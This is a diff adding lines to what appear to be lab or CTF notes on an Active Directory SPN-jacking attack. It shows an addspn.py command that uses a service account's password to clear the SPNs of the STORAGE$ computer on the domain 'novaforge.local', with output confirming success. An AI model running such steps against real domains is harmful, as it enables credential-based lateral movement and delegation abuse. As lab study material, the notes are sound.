@@ -1176,3 +1176,29 @@ svc_it_admin  Person       Constrained w/ Protocol Transition  WSMAN/STORAGE    
 
 https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking
 
+Whats also helpful is i can follow the exact steps in this website, since i have t
+
+```python
+python3 addspn.py --clear -t 'STORAGE$' -u 'novaforge.local\svc_it_admin' -p 'Password123!' "dc.novaforge.local" 
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] Printing object before clearing
+DN: CN=STORAGE,CN=Computers,DC=novaforge,DC=local - STATUS: Read - READ TIME: 2026-08-08T19:27:41.041449
+    dNSHostName: STORAGE.novaforge.local
+    sAMAccountName: STORAGE$
+    servicePrincipalName: HTTP/STORAGE.novaforge.local
+                          HTTP/STORAGE
+                          TERMSRV/STORAGE
+                          TERMSRV/STORAGE.novaforge.local
+                          WSMAN/STORAGE
+                          WSMAN/STORAGE.novaforge.local
+                          RestrictedKrbHost/STORAGE
+                          HOST/STORAGE
+                          RestrictedKrbHost/STORAGE.novaforge.local
+                          HOST/STORAGE.novaforge.local
+
+[+] SPN Modified successfully
+```
+
